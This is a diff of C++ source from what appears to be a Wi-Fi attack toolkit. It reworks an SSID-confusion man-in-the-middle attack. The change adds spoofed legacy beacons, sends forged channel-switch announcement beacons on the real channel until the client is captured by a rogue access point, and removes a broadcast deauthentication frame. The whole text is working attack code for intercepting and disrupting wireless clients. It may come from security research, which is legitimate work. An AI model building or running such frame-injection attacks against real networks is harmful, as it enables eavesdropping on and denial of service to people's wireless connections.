@@ -1,4 +1,5 @@
 #include "attacks/DoS_soft/channel_switch/channel_switch.h"
+#include "attacks/DoS_soft/expected_vht_beacon/expected_vht_beacon.h"
 #include "attacks/mc_mitm/mc_mitm.h"
 #include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
 #include "attacks/mc_mitm/wifi_util.h"
@@ -11,12 +12,9 @@ using namespace std;
 using namespace chrono;
 
 void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
-	const string real_ssid = ap.get(SK::ssid);          // "WrongNet"
-
 	rogue_ap->set_iface_up();
     rogue_sta->set_iface_up();
 
-    const HWAddress<6> ap_bssid(ap.get(SK::permanent_mac));
 	// have to be same as ap  (At least EAP-pwd, every what need AP mac)
     const HWAddress<6> rogue_ap_mac(rogue_ap.get(SK::mac));
     const HWAddress<6> client_perm(sta.get(SK::permanent_mac));
@@ -37,6 +35,8 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
             const_cast<uint8_t *>(ht_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
     }
     probe_resp = std::make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*confused_beacon, netconfig.rogue_channel));
+
+	Dot11Beacon legacy_beacon = expected_vht_beacon_attack::build_legacy_beacon(*beacon);
 
     // BPF: AP + client traffic only
 	const string bpf = "(wlan type data or mgt) and (wlan host " + ap.get(SK::permanent_mac) + " or wlan host " +
@@ -68,15 +68,10 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
         }
     }*/
 
-    // broadcast deauth so client re-scans
-    Dot11Deauthentication deauth(HWAddress<6>::broadcast, HWAddress(ap_bssid));
-    deauth.addr3(HWAddress(ap_bssid));
-    deauth.reason_code(2); // PREV_AUTH_NOT_VALID -> reset PMKSA
-    send_to_real(deauth);
 
     const auto start      = steady_clock::now();
     auto next_beacon      = steady_clock::now();
-    int  csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
+    int csa_cnt           = CSA_attack::CHANNEL_SWITCH_MAX;
 
     while(true) {
         if(steady_clock::now() > start + seconds(timeout_sec)) {
@@ -107,11 +102,12 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
 
 		if(next_beacon <= steady_clock::now()) {
             send_to_rogue(*confused_beacon);
-            RadioTap csa = CSA_attack::get_CSA_beacon(ap.get(SK::mac),
-            	netconfig.real_channel, { 6, WifiBand::BAND_2_4, nullopt }, //TODO move client to other random channel to reset PMKSA
-            	csa_count, beacon.get());
-            send_to_real(csa);
-            if(--csa_count < 0) csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
+            if(client_state.get_state() < ClientState::GotMitm) {
+                send_to_real(legacy_beacon);
+                auto csa = CSA_attack::get_CSA_beacon(ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, csa_cnt, beacon.get());
+                send_to_real(csa);
+                if(--csa_cnt < 0) csa_cnt = CSA_attack::CHANNEL_SWITCH_MAX;
+            }
             next_beacon += milliseconds(beacon_ms);
         }
     }
